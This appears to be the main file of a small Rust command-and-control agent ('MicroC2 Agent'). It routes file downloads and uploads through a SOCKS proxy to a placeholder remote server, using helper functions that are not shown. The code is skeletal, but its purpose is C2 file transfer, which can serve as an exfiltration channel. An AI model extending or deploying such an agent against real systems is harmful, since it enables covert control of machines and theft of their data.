extern crate tokio;
extern crate tokio_socks;

mod file_handling;

use file_handling::{download::download_file, upload::upload_file};

#[tokio::main]
async fn main() {
    println!("MicroC2 Agent starting...");

    // Example configuration
    let proxy_addr = "127.0.0.1:1080";
    let target_addr = "remote.server:443";

    if let Err(e) = run_file_operations(proxy_addr, target_addr).await {
        eprintln!("Error during file operations: {}", e);
    }
}

async fn run_file_operations(proxy_addr: &str, target_addr: &str) -> std::io::Result<()> {
    // Example file operations
    download_file(
        "remote/file.txt",
        "local/file.txt",
        proxy_addr,
        target_addr
    ).await?;

    upload_file(
        "local/file.txt",
        "remote/uploaded.txt",
        proxy_addr,
        target_addr
    ).await?;

    Ok(())
}
